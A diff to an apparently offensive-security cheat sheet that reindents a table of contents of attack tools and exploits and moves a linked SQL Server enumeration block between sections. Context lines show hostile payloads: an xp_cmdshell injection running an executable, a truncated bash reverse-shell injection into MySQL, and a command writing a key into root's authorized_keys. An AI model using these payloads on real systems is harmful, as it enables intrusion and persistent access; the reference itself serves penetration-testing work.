@@ -108,14 +108,14 @@ Thank you for reading.
 	- [Password Attacks](#password-attacks-1)
 		- [CrackMapExec](#crackmapexec)
 		- [fcrack](#fcrack)
-    		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
+        		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
 		- [hashcat](#hashcat)
 		- [Hydra](#hydra)
 		- [John](#john)
 		- [Kerbrute](#kerbrute)
 		- [LaZagne](#lazagne)
 		- [mimikatz](#mimikatz)
-    		- [NetExec](#NetExec)
+        		- [NetExec](#NetExec)
 		- [pypykatz](#pypykatz)
 	- [Exploitation Tools](#exploitation-tools-1)
 		- [Metasploit](#metasploit)
@@ -123,10 +123,10 @@ Thank you for reading.
  		- [Abusing Account Operators Group Membership](#abusing-account-operators-group-membership)
  		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
 		- [ADCSTemplate](#adcstemplate)
-    		- [ADMiner](#adminer)
+        		- [ADMiner](#adminer)
 		- [BloodHound](#bloodhound)
 		- [BloodHound Python](#bloodhound-python)
-    		- [bloodyAD](#bloodyAD)
+        		- [bloodyAD](#bloodyAD)
 		- [Certify](#certify)
 		- [Certipy](#certipy)
 		- [enum4linux-ng](#enum4linux-ng)
@@ -143,7 +143,7 @@ Thank you for reading.
 		- [powercat](#powercat)
 		- [Powermad](#powermad)
 		- [PowerShell](#powershell)
-    		- [PrivescCheck](#privesccheck)
+        		- [PrivescCheck](#privesccheck)
 		- [pwncat](#pwncat)
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
@@ -163,13 +163,13 @@ Thank you for reading.
 		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
 		- [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
 		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
-    		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
-      		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
-    		- [GodPotato LPE](#godpotato-lpe)
+        		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
+            		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
+          		- [GodPotato LPE](#godpotato-lpe)
 		- [Juicy Potato LPE](#juicy-potato-lpe)
-    		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
+        		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
 		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
-    		- [PrintSpoofer LPE](#printspoofer-lpe)
+        		- [PrintSpoofer LPE](#printspoofer-lpe)
 		- [SharpEfsPotato LPE](#sharpefspotato-lpe)
 		- [Shocker Container Escape](#shocker-container-escape)
 	- [Payloads](#payloads-1)
@@ -2003,6 +2003,17 @@ SQL> xp_cmdshell whoami
 ';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
 ```
 
+##### Linked SQL Server Enumeration
+
+```c
+SQL> SELECT user_name();
+SQL> SELECT name,sysadmin FROM syslogins;
+SQL> SELECT srvname,isremote FROM sysservers;
+SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+```
+
 
 
 #### MySQL
@@ -2044,17 +2055,6 @@ mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >&
 
 ```c
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
-```
-
-##### Linked SQL Server Enumeration
-
-```c
-SQL> SELECT user_name();
-SQL> SELECT name,sysadmin FROM syslogins;
-SQL> SELECT srvname,isremote FROM sysservers;
-SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 ```
 
 #### NoSQL Injection
